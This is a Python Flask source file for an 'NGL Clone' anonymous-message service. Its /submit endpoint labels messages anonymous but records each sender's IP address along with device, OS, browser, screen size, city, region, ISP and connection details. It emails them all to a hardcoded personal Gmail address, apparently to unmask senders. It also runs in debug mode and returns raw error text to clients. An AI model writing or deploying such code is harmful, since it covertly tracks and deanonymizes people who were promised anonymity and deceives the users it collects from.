import os
from flask import Flask, request, jsonify
from hotmail_flask_mailer.app import mailer_instance
import json

app = Flask(__name__)

email = os.getenv("HOTMAIL_EMAIL")
password = os.getenv("HOTMAIL_PASSWORD")
mailer_instance.save(email=email, password=password)

messages = []

@app.route('/submit', methods=['POST'])
def submit_message():
    try:
        data = request.json
        anonymous_message = data.get("message")
        ip = request.remote_addr
        device_type = data.get("device_type")
        os = data.get("os")
        browser = data.get("browser")
        screen_size = data.get("screen_size")
        city = data.get("city")
        region = data.get("region")
        isp_name = data.get("isp_name")
        connection_type = data.get("connection_type")

        message_data = {
            "message": anonymous_message,
            "ip": ip,
            "device_type": device_type,
            "os": os,
            "browser": browser,
            "screen_size": screen_size,
            "city": city,
            "region": region,
            "isp_name": isp_name,
            "connection_type": connection_type
        }
        messages.append(message_data)

        email_content = json.dumps(message_data, indent=4)
        status = mailer_instance.send(
            receiver="prakhardoneria3@gmail.com",
            subject="New Anonymous Message",
            message=f"New message received on NGL Clone:\n\n{email_content}"
        )

        messages.clear()
        if not status:
            return jsonify({"success": False, "message": "Failed to send email"}), 500

        return jsonify({"success": True, "message": "Message stored and email sent successfully!"}), 200
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
